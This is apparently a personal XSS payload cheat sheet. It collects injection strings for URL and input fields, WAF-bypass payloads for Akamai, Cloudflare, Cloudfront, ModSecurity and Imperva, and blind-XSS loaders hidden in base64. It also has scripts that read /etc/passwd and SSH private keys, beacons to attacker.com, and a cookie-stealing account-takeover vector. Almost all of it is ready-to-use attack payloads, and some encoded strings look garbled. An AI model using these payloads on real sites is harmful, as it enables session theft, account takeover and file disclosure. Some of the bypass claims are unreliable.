	
`<button onClick=”alert(document.cookie)”>Submit</button>

	Here's a small #XSS list for manual testing (main cases, high success rate).  
  
`"><img src onerror=alert(1)>  
`"autofocus onfocus=alert(1)//  
`</script><script>alert(1)</script>  
'-alert(1)-'  
`\'-alert(1)//  
`javascript:alert(1)  
  
Try it on:  
- URL query, fragment & path;  
- all input fields.  
  
A nice way to store the payload  
  
`"><script>eval(new URL(document.location.href+"#javascript:confirm(69)").hash.slice(1))</script>  
  
`A payload to bypass Akamai WAF  
   
`<A href="javascrip%09t&colon;eval.apply`${[jj.className+`(23)`]}`" id=jj class=alert>Click Here  
  
Another one  
  
`"><img/src/style=html:url("data:,"><svg/onload=confirm(69)>")>  
  
`BlindXSS-Payloads: #Max Payload 5-7  
  
  `- '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3Jgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vamVycnkuYnhzm9keS5hcHBlbmRDaGlsZChhKTs=&#61 onerror=eval(atob([this.id](https://this.id "https://this.id/")))>'  
  
  `- "'><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS57ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=&#61 onerror=eval(atob([this.id](https://this.id "https://this.id/")))>"
`xss to lfi payload -  
  
`1) <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};[x.open](https://x.open "https://x.open/")(‘GET’,’file:///etc/hosts’);x.send();</script>  
   
`2) <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};[x.open](https://x.open "https://x.open/")(‘GET’,’file:///etc/passwd’);x.send();</script>  
  
`3) get ssh private key - <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};[x.open](https://x.open "https://x.open/")("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>  
  
Pining the server down  
  
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->  
`<script>  
    let time = 500;  
    setInterval(()=>{  
        let img = document.createElement("img");  
        img.src = `https://attacker.com/ping?time=${time}ms`;  
        time += 500;  
    }, 500);  
`</script>  
`<img src="[https://attacker.com/delay](https://attacker.com/delay "https://attacker.com/delay")">`

SOME OF THE TOP XSS WAF BYPASS PAYLOADS :)  
  
Akamai WAf:  
';k='e'%0Atop['al'+k+'rt'](A-MY-NOTES/js/1.md)//  
`'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](A-MY-NOTES/js/1.md)>  
  
CloudFlare WAf:  
<svg/onload=window["al"+"ert"]`1337`>  
`<Img Src=OnXSS OnError=confirm(1337)>  `
`<Svg Only=1 OnLoad=confirm(document.domain)>  
`<svg onload=alert&#0000000040document.cookie)>  
<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>  
%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E  
`<Img Src=//[X55.is](https://x55.is/ "https://x55.is/") OnLoad%0C=import(Src)>  
`<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>  
  
Cloudfront Waf:  
">'><details/open/ontoggle=confirm('XSS')>  
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/  
';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//  
`">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>  
  
Mod security:  
`<svg onload='new Function`["Y000!"].find(al\u0065rt)`'>  
  
Imperva Waf:  
`<Img Src=//[X55.is](https://x55.is/ "https://x55.is/") OnLoad%0C=import(Src)>  
`<sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">  
`<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;  
lert&#x000000028;origin&#x000029;>  
                                                                          ~/.lostsec@coffin

If CSP policies blocked you while trying XSS, be sure to try two separate XSS payloads (encoded) one after another, this may help you bypass the file.  
1-  
%3C/script%20%3E  
2- mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E


Cloudflare provides robust security measures to protect websites from various attacks, including Cross-Site Scripting (XSS). However, attackers may still find ways to bypass these protections. Here are 10 examples of XSS payloads that could potentially bypass Cloudflare's XSS protection:  
  
1. Unicode encoding:  

html

```
<scr&#x9Cipt>alert(1)</scr&#x9Cipt>
```

2. Using HTML entities:  

<img src=x onerror=&#x61lert&#x28&#x27123&#x27&#x29>

3. Using JavaScript URL encoding:  

html

```
<script src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x68&#x74&#x74&#x70&#x3A&#x2F&#x2F&#x77&#x77&#x77&#x2E&#x61&#x6C&#x65&#x72&#x74&#x2E&#x63&#x6F&#x6D&#x2F&#x73&#x63&#x72&#x69&#x70&#x74&#x27&#x29>
```

4. Using JavaScript encoding:  

html

```
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

5. Using CSS expressions:  

html

```
<style>@import'\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0077\u0077\u0077\u002E\u0061\u006C\u0065\u0072\u0074\u002E\u0063\u006F\u006D\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u0027\u0029';</style>
```

6. Using JavaScript comments:  

html

```
<script>/*-/**/alert(1)/*-/*-->/*</script>
```

7. Using event handlers:  

html

```
<body onload=alert(1)>
```

8. Using JavaScript encoding with comments:  

html

```
<script>eval(String.fromCharCode(/*-*/97/*-*/,/*-*/108/*-*/,/*-*/101/*-*/,/*-*/114/*-*/,/*-*/116/*-*/,/*-*/40/*-*/,/*-*/49/*-*/,/*-*/41/*-*/))</script>
```

9. Using JavaScript encoding with whitespace:  

html

```
<script>eval(String.fromCharCode( 97, 108, 101, 114, 116, 40, 49, 41 ))</script>
```

10. Using JavaScript encoding with different encoding schemes:  

html

```
<script>eval(String.fromCharCode(0x61,0x6C,0x65,0x72,0x74,0x28,0x31,0x29))</script>
```

Example of 1Click ATO by Openredirect to xss with filter bypass  
javascript://%0aalert(document.cookie)
